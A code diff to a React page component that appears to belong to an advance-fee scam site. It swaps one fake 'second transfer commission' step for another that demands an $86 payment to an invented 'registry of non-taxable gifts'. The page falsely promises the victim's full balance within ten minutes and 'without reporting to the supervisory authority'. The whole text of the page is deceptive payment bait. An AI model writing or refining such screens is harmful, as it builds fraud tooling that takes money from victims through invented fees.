@@ -6,14 +6,13 @@ import { useSelector } from "react-redux"
 import { thousandsFormatter, useGoTo } from "../../utils"
 import FormCheckItem from "../../components/FormCheckItem"
 import {
-  COMMISSION_EXPRESS_PAGE,
-  COMMISSION_PAGE,
-  COMMISSIONSP_PAGE
+  COMMISSIOM_TRANSITBOOKING_PAGE,
+  COMMISSION_PAGE
 } from "../../constants"
 
-const nextPage = `/${COMMISSION_PAGE}/${COMMISSION_EXPRESS_PAGE}`
-// 2-1
-const Commissionsp = () => {
+const nextPage = `/${COMMISSION_PAGE}/${COMMISSIOM_TRANSITBOOKING_PAGE}`
+// 2-4
+const Transitbooking = () => {
   const balance = useSelector(state => state.user.balance)
 
   const goToNext = useGoTo()
@@ -70,7 +69,7 @@ const Commissionsp = () => {
         </Flex>
         <Flex
           flexDir={"column"}
-          justifyContent={{ md: "space-between" }}
+          justifyContent={{ md: "flex-start" }}
           gridRow={"span 2"}
         >
           <Text
@@ -78,33 +77,38 @@ const Commissionsp = () => {
             fontWeight={"600"}
             textAlign={{ base: "center", md: "left" }}
           >
-            Second transfer commission is requested by the payment system.
+            The transfer requires registration in the registry of non-taxable
+            gifts
           </Text>
           <br />
           <Text fontSize={{ base: "16px", md: "20px" }}>
-            The first transfer is marked as <b>paid</b> in the amount of{" "}
-            <b>${Math.floor(balance / 2)}</b>.
+            In order to <b>promptly receive the entire amount</b> of the{" "}
+            <b>${balance}</b> payment{" "}
+            <b>without reporting to the supervisory authority</b>, it is{" "}
+            <b>mandatory</b> to make a transter to the{" "}
+            <b>gratuitous rewards registry</b>. This step is necessary to ensure
+            you receive all the funds.
             <br />
             <br />
-            Second transfer commission must be paid before first transfer can be
-            sent.
-            <br />
-            <br />
-            Both transfers will be sent to your specified details after the
-            second transfer <b>commission is paid</b>.
+            Once you have made the transfer to the registry, the{" "}
+            <b>funds will be booked in the transit cell</b> and{" "}
+            <b>sent to the details you provided within 10 minutes.</b>
           </Text>
         </Flex>
         <Flex flexDir={"column"} fontSize={"20px"}>
           <Text fontSize={"20px"} mb={"10px"}>
-            Payment divided into two parts, second transfer is for{" "}
-            <b>${Math.floor(balance / 2)}</b> with acommission fee of <b>$48</b>
-            .
+            The cost for registering in the registry: <b>$86.</b>
           </Text>
           <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
-            <FormCheckItem checked={true} label={"Guaranteed fast payment."} />
             <FormCheckItem
               checked={true}
-              label={" Pay the second transfer fee to receive the full amount."}
+              label={"Please make the transfer to the registry now"}
+            />
+            <FormCheckItem
+              checked={true}
+              label={
+                "Your funds will instantly arrive in the previously indicated account"
+              }
             />
           </Flex>
         </Flex>
@@ -129,7 +133,7 @@ const Commissionsp = () => {
             mr={{ md: "40px" }}
             onClick={() => goToNext(nextPage)}
           >
-            Make payment for the second transfer&apos;s fee
+            Submit to the registry
           </Button>
         </Flex>
       </Flex>
@@ -137,4 +141,4 @@ const Commissionsp = () => {
   )
 }
 
-export default Commissionsp
+export default Transitbooking
